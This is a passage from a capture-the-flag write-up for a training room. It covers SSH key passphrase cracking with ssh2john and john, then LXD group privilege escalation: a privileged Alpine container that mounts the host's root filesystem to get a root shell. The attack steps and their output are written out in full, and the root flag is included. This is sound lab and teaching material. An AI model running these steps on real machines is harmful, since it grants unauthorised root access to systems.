- In source code of main page you can find valuable comment and in `/uploads` directory you'll find list, note and a meme. Download them all.

  ```<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->```
  
- In `/secret` directory is a RSA key, download it as well.

  ```

  -----END RSA PRIVATE KEY-----
  ```

- Since we already have username and key, we just need a passphrase for SSH login. We will get that through john and login with SSH. For wordlist use the list we found in `/uploads`

  ```
  ssh2john id_rsa > key.hash

- Moving to escalation.

## üëë Root Privilege Escalation

- OK, so here I spent a lot of time enumerating and trying to find any sort of exploitation, but couldn't. After googling for a while, I found that group `(lxd)` is our way to root, which I already saw after logging in but didn't know what it is.

  ```
  john@exploitable:~$ id
  uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  
  john@exploitable:~$ which lxd
  /usr/bin/lxd
  
  john@exploitable:~$ which lxc
  /usr/bin/lxc
  ```
  
- Perfect, since target machine already has both `lxd` and `lxc` installed we can move to exploitation immediately.
  
- First, on your Kali, clone this repo and move to it. You will see inside a file `alpine-v3.13-x86_64-20210218_0139.tar.gz`, that's our way in.

  ```
  git clone https://github.com/saghul/lxd-alpine-builder.git
  cd lxd-alpine-builder
  ```

- If for some reason you don't have the image aka `.tar.gz` file, use `sudo ./build-alpine` and it will create alpine image for you.
  For me, it crashed when I used it due to missing key, but `.tar.gz` was already there so I could still exploit the machine as long as I have the image file.
  So remember, you can do the exploitation as long as you have image file, don't extract it nor anything, keep it as it is and move it to target machine.

- For simpler use, move the file somewhere else and change it's name.

  ```cp alpine-v3.13-x86_64-20210218_0139.tar.gz /path/to/wherever/alpine.tar.gz```

- We are still on our own machine, go to the directory where image file is and run Python HTTP server, then download the file to target machine with `wget`.

  ```
  ATACKER:
  python3 -m http.server 80

  TARGET:
  wget http://[YOUR-THM-IP]/alpine.tar.gz

  john@exploitable:~$ wget http://[YOUR-THM-IP]:80/alpine.tar.gz
  --2025-05-14 20:16:03--  http://[YOUR-THM-IP]2/alpine.tar.gz
  Connecting to [YOUR-THM-IP]:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 3259593 (3.1M) [application/gzip]
  Saving to: ‚Äòalpine.tar.gz‚Äô
  
  alpine.tar.gz                 100%[==============================================>]   3.11M  3.70MB/s    in 0.8s    
  
  2025-05-14 20:16:04 (3.70 MB/s) - ‚Äòalpine.tar.gz‚Äô saved [3259593/3259593]
  
  john@exploitable:~$ ls
  alpine.tar.gz  user.txt
  ```

- Now the best part, exploitation. On target machine, these are the following commands I used, there's couple of different ways for exploitation, after them I'll post how it looked in action. Import then proceed with commands.

  ```
  lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias pwned
  lxc init pwned breakout -c security.privileged=true
  lxc config device add breakout mydev disk source=/ path=/mnt/root recursive=true
  lxc start breakout
  lxc exec breakout /bin/sh
  ```

  Now in action, I changed image file to `alpine.tar.gz` so I don't have to type all of these numbers.

  ```
  john@exploitable:~$ ls
  alpine.tar.gz  user.txt
  
  john@exploitable:~$ lxc image import alpine.tar.gz --alias pwned
  Image imported with fingerprint: [SNIP!]
  
  john@exploitable:~$ lxc init pwned backdoor -c security.privileged=true
  Creating backdoor
  
  john@exploitable:~$ lxc config device add backdoor hackroot disk source=/ path=/mnt/root recursive=true
  Device hackroot added to backdoor
  
  john@exploitable:~$ lxc start backdoor
  john@exploitable:~$ lxc exec backdoor /bin/sh
  ~ # whoami
  root
  ~ # cd /mnt/root/root
  /mnt/root/root # cat root.txt
  2e337b8c9f3aff0c2b3e8d4e6a7c88fc
  /mnt/root/root # 
  ```

- This is my first time doing this exploitation and it was so cool and so fun, loved it!

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Escalating privileges, my first time exploiting LXD/LXC`

- What did I learn?
  `New awesome way of privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
